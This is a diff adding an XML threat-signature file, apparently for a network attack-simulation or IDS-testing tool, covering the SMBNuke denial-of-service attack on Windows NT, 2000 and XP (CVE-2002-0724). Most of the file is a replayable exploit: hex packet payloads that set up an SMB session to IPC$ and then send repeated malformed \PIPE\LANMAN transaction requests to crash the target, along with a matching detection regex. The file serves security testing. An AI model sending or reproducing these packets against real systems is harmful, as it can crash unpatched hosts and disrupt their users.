@@ -1,0 +1,150 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="SMBNuke Attack"/>
+    <EngDesc display="true" value="This threat causes a vulnerable Windows machine to crash by sending a malicious SMB request.  This threat travels over the NetBIOS Session Service, which is typically port 139."/>
+    <Intent display="true">
+      <item value="Denial_of_Service"/>
+      <item value="Crashing"/>
+    </Intent>
+    <Protocol display="true" value="NETBIOS_SS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Host"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Microsoft_Windows"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Microsoft_Windows_2000"/>
+      <item value="Microsoft_Windows_XP"/>
+      <item value="Microsoft_Windows_NT_4.0"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.microsoft.com/technet/treeview/default.asp?url=/technet/security/bulletin/MS02-045.asp"/>
+    <CVEID display="true" value="CVE-2002-0724"/>
+    <bugtraqID display="true" value="5556"/>
+    <OSVDB display="true" value="2074"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="000001059ec4681d00c000a80001003c57c3ce1e"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632742200098125000"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="F"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X00\X00\X00\X5F\XFF\X53\X4D\X42\X25\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X08\XED\X37\X00\X08\X00\X00\X0E\X13\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X13\X00\X4C\X00\X00\X00\X5F\X00\X00\X00\X20\X00\X5C\X50\X49\X50\X45\X5C\X4C\X41\X4E\X4D\X41\X4E\X00\X68\X00\X57\X72\X4C\X65\X68\X00\X42\X31\X33\X42\X57\X7A\X00\X01\X00\X50\XC3\X00\X00\X00\X5F\XFF\X53\X4D\X42\X25\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X08\X43\X5F\X00\X08\X00\X00\X0E\X13\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X13\X00\X4C\X00\X00\X00\X5F\X00\X00\X00\X20\X00\X5C\X50\X49\X50\X45\X5C\X4C\X41\X4E\X4D\X41\X4E\X00\X68\X00\X57\X72\X4C\X65\X68\X00\X42\X31\X33\X42\X57\X7A\X00\X01\X00\X50\XC3\X00\X00\X00\X5F\XFF\X53\X4D\X42\X25\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X08\XC8\X85\X00\X08\X00\X00\X0E\X13\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X13\X00\X4C\X00\X00\X00\X5F\X00\X00\X00\X20\X00\X5C\X50\X49\X50\X45\X5C\X4C\X41\X4E\X4D\X41\X4E\X00\X68\X00\X57\X72\X4C\X65\X68\X00\X42\X31\X33\X42\X57\X7A\X00\X01\X00\X50\XC3\X00\X00\X00\X5F\XFF\X53\X4D\X42\X25\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X08\X92\XA3\X00\X08\X00\X00\X0E\X13\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X13\X00\X4C\X00\X00\X00\X5F\X00\X00\X00\X20\X00\X5C\X50\X49\X50\X45\X5C\X4C\X41\X4E\X4D\X41\X4E\X00\X68\X00\X57\X72\X4C\X65\X68\X00\X42\X31\X33\X42\X57\X7A\X00\X01\X00\X50\XC3\X00\X00\X00\X5F\XFF\X53\X4D\X42\X25\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X08\X24\XB6\X00\X08\X00\X00\X0E\X13\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X13\X00\X4C\X00\X00\X00\X5F\X00\X00\X00\X20\X00\X5C\X50\X49\X50\X45\X5C\X4C\X41\X4E\X4D\X41\X4E\X00\X68\X00\X57\X72\X4C\X65\X68\X00\X42\X31\X33\X42\X57\X7A\X00\X01\X00\X50\XC3\X00\X00\X00\X5F\XFF\X53\X4D\X42\X25\X00\X00\X00\X00\X00\X00\X00"/>
+    <Created value="1139461788" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="G"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="H"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="I"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="J"/>
+    <NamedVar name="NETBIOS_SSdestPort" type="ImperfectControls.Port" value="null" index="K"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="G"/>
+      <for index="H"/>
+      <for index="I"/>
+      <for index="J"/>
+      <for index="K"/>
+    </for>
+    <for index="B">
+      <for index="G"/>
+      <for index="H"/>
+      <for index="I"/>
+      <for index="J"/>
+      <for index="K"/>
+    </for>
+    <for index="C">
+      <for index="G"/>
+      <for index="H"/>
+      <for index="I"/>
+      <for index="J"/>
+      <for index="K"/>
+    </for>
+    <for index="D">
+      <for index="G"/>
+      <for index="H"/>
+      <for index="I"/>
+      <for index="J"/>
+      <for index="K"/>
+    </for>
+    <for index="E">
+      <for index="G"/>
+      <for index="H"/>
+      <for index="I"/>
+      <for index="J"/>
+      <for index="K"/>
+    </for>
+    <for index="F">
+      <for index="G"/>
+      <for index="H"/>
+      <for index="I"/>
+      <for index="J"/>
+      <for index="K"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$NETBIOS_SSdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="8100004820454E4550454F45484550455046444546434143414341434143414341434143410020434143414341434143414341434143414341434143414341434143414341414100" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="B" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$NETBIOS_SSdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="000000A4FF534D427200000000000000000000000000000000000000000000FD0000CEA8008100025043204E4554574F524B2050524F4752414D20312E3000024D4943524F534F4654204E4554574F524B5320312E303300024D4943524F534F4654204E4554574F524B5320332E3000024C414E4D414E312E3000024C4D312E3258303032000253616D626100024E54204C4D20302E313200024E54204C414E4D414E20312E3000" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="C" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$NETBIOS_SSdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="00000054FF534D4273000000000801000000000000000000000000000000F80E00000C830DFF000000FFFF020001040000000001000000000000000000000017000000574F524B47524F555000556E69780053616D626100" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="D" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$NETBIOS_SSdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="00000040FF534D4275000000001801200000000000000000000000000000A3EA0008000004FF000000000001001500005C5C6D6F6E676F6F73655C495043240049504300" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="E" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$NETBIOS_SSdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="0000005FFF534D42250000000000000000000000000000000000000000087DD0000800000E13000000000000000000000000000000000013004C0000005F00000020005C504950455C4C414E4D414E00680057724C65680042313342577A00010050C3" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="F" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$NETBIOS_SSdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="0000005FFF534D4225000000000000000000000000000000000000000008ED37000800000E13000000000000000000000000000000000013004C0000005F00000020005C504950455C4C414E4D414E00680057724C65680042313342577A00010050C30000005FFF534D4225000000000000000000000000000000000000000008435F000800000E13000000000000000000000000000000000013004C0000005F00000020005C504950455C4C414E4D414E00680057724C65680042313342577A00010050C30000005FFF534D4225000000000000000000000000000000000000000008C885000800000E13000000000000000000000000000000000013004C0000005F00000020005C504950455C4C414E4D414E00680057724C65680042313342577A00010050C30000005FFF534D422500000000000000000000000000000000000000000892A3000800000E13000000000000000000000000000000000013004C0000005F00000020005C504950455C4C414E4D414E00680057724C65680042313342577A00010050C30000005FFF534D422500000000000000000000000000000000000000000824B6000800000E13000000000000000000000000000000000013004C0000005F00000020005C504950455C4C414E4D414E00680057724C65680042313342577A00010050C30000005FFF534D4225000000000000000000000000000000000000000008B702000800000E13000000000000000000000000000000000013004C0000005F00000020005C504950455C4C414E4D414E00680057724C65680042313342577A00010050C30000005FFF534D42250000000000000000000000000000000000000000084C8B000800000E13000000000000000000000000000000000013004C0000005F00000020005C504950455C4C414E4D414E00680057724C65680042313342577A00010050C30000005FFF534D4225000000000000000000000000000000000000000008F613000800000E13000000000000000000000000000000000013004C0000005F00000020005C504950455C4C414E4D414E00680057724C65680042313342577A00010050C30000005FFF534D4225000000000000000000000000000000000000000008D513000800000E13000000000000000000000000000000000013004C0000005F00000020005C504950455C4C414E4D414E00680057724C65680042313342577A00010050C3" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
